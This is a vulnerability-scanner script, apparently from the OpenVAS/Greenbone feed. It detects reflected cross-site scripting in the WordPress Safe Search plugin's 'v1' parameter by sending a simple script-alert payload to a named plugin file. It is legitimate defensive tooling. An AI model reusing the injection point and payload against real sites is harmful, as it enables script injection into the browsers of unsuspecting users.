CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801490" );
	script_version( "2021-09-07T06:04:54+0000" );
	script_tag( name: "last_modification", value: "2021-09-07 06:04:54 +0000 (Tue, 07 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-12-21 15:42:46 +0100 (Tue, 21 Dec 2010)" );
	script_cve_id( "CVE-2010-4518" );
	script_bugtraq_id( 45267 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "WordPress Safe Search Plugin 'v1' Parameter Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/42544" );
	script_xref( name: "URL", value: "http://www.johnleitch.net/Vulnerabilities/WordPress.Safe.Search.0.7.Reflected.Cross-site.Scripting/66" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in context of an affected site." );
	script_tag( name: "affected", value: "WordPress Safe Search Plugin 0.7 and prior" );
	script_tag( name: "insight", value: "The input passed to 'v1' parameter in
'wp-content/plugins/wp-safe-search/wp-safe-search-jx.php' script is not
properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WordPress and is prone to Cross Site
Scripting Vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
wpPort = get_app_port( cpe: CPE );
if(!wpPort){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: wpPort )){
	exit( 0 );
}
if(dir != NULL){
	sndReq = http_get( item: NASLString( dir, "/wp-content/plugins/wp-safe-search/" + "wp-safe-search-jx.php?v1=<script>alert(XSS-Testing)</script>" ), port: wpPort );
	rcvRes = http_send_recv( port: wpPort, data: sndReq );
	if(IsMatchRegexp( rcvRes, "HTTP/1\\.. 200" ) && ContainsString( rcvRes, "<script>alert(XSS-Testing)</script>" )){
		security_message( wpPort );
	}
}

